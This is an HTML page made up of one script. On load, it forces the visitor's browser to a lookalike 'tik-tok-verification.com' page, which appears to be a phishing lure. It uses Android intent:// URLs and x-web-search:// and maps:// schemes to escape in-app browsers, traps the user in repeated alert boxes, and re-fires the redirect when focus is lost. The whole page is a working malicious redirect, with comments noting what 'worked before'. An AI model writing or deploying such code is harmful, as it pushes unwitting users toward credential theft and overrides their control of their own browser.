<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; 

    function forceJump() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        // THE PRIMARY JUMP (What worked for you before)
        if (isAndroid) {
            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
        } else {
            window.location.replace("x-web-search://?" + encodeURIComponent(target));
            // Back-to-back collision
            window.location.href = "maps://?q=" + encodeURIComponent(target);
        }
    }

    function rampage() {
        if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE

        // 1. Fire redirect right before the alert
        forceJump();

        // 2. The Lock
        alert("ATTEMPT #19 (REDO)\n\nTap OK to sync with system browser.");

        // 3. THE MICRO-WINDOW: 
        // We use requestAnimationFrame to fire the redirect the INSTANT 
        // the "OK" button is clicked and the UI unfreezes.
        requestAnimationFrame(() => {
            forceJump();
            
            // Wait just 10ms to let the OS catch the intent, then re-lock
            setTimeout(rampage, 10);
        });
    }

    window.onload = () => {
        rampage();
    };

    // Re-lock if focus is lost
    window.onblur = () => { if (Date.now() < killTime) rampage(); };
</script>

</body>
</html>
